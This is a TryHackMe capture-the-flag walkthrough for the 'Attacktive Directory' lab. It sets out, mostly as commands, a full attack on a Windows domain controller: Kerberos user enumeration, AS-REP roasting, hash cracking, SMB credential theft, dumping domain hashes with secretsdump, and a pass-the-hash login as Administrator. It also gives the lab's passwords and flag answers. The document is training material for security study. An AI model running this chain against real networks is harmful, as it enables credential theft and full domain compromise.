# Attacktive Directory

**Room Link:** [https://tryhackme.com/room/attacktivedirectory](https://tryhackme.com/room/attacktivedirectory)



## Walkthrough

### Setup

#### Installing Impacket

```
git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket
pip3 install -r /opt/impacket/requirements.txt
cd /opt/impacket/ && python3 ./setup.py install
```

#### Installing Bloodhound and Neo4j

```
apt install bloodhound neo4j
```

#### Installing kerbrute

```
git clone https://github.com/ropnop/kerbrute.git
cd kerbrute/
make all
```

### username and password custom lists for this machine

```
wget https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt
wget https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt
```

### Welcome to Attacktive Directory

#### **Initial Scan**

```
nmap -A $VICTIM
```

<figure><img src="../../.gitbook/assets/image (1) (10).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (16) (1) (3).png" alt=""><figcaption></figcaption></figure>

#### Scan all ports

```
nmap -sV -sT -O -p 1-65535 $VICTIM
```

<figure><img src="../../.gitbook/assets/image (5) (6) (2).png" alt=""><figcaption></figcaption></figure>

### netbios-ssn port 139 & microsoft-ds port 445

```
enum4linux $VICTIM
```

The NetBIOS-Domain Name of the machine

<figure><img src="../../.gitbook/assets/image (4) (6) (1).png" alt=""><figcaption></figcaption></figure>

### Enumerating Users via Kerberos port 88

```
kerbrute/dist/kerbrute_linux_386 userenum --dc=$VICTIM -d=spookysec.local. userlist.txt
```

<figure><img src="../../.gitbook/assets/image (27) (3).png" alt=""><figcaption></figcaption></figure>

### Abusing Kerberos

**validusers.txt**

```
james
svc-admin
robin
darkstar
administrator
backup
paradox
```

svc-admin allows us to get a ticket without a password. The hash type is Kerberos 5 etype 23 AS-REP.

```
python3.9 /opt/impacket/examples/GetNPUsers.py -no-pass -usersfile validusers.txt -dc-ip $VICTIM spookysec.local/
```

<figure><img src="../../.gitbook/assets/image (6) (1) (4) (2).png" alt=""><figcaption></figcaption></figure>

Cracking the hash we can see the password is management2005

```
hashcat -m18200 hash.txt passwordlist.txt
hashcat -m18200 hash.txt passwordlist.txt --show
```

<figure><img src="../../.gitbook/assets/image (28) (4) (1).png" alt=""><figcaption></figcaption></figure>

### Back to the Basics

### netbios-ssn port 139 & microsoft-ds port 445

```
smbclient -L $VICTIM -U "svc-admin"
Enter WORKGROUP\svc-admin's password: management2005
```

<figure><img src="../../.gitbook/assets/image (7) (2) (2).png" alt=""><figcaption></figcaption></figure>

```
smbclient \\\\$VICTIM\\backup -U "svc-admin"
smb: \> dir
smb: \> get backup_credentials.txt 
```

<figure><img src="../../.gitbook/assets/image (3) (8) (1).png" alt=""><figcaption></figcaption></figure>

Its a base64 encoded username and password. backup@spookysec.local:backup2517860

```
cat backup_credentials.txt
echo "YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw" | base64 -d
```

<figure><img src="../../.gitbook/assets/image (18) (5).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (20) (1) (2).png" alt=""><figcaption></figcaption></figure>

### Elevating Privileges within the Domain - **WinRM** port5985

```
python3 /usr/local/bin/secretsdump.py  spookysec.local/backup:backup2517860@$VICTIM > allhashes.txt
cat allhashes.txt | awk -F : '{print $1 ":" $3}' | sort | uniq
```



### Flag Submission PaneLogin as Administrator&#x20;

```
evil-winrm -i $VICTIM -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
```
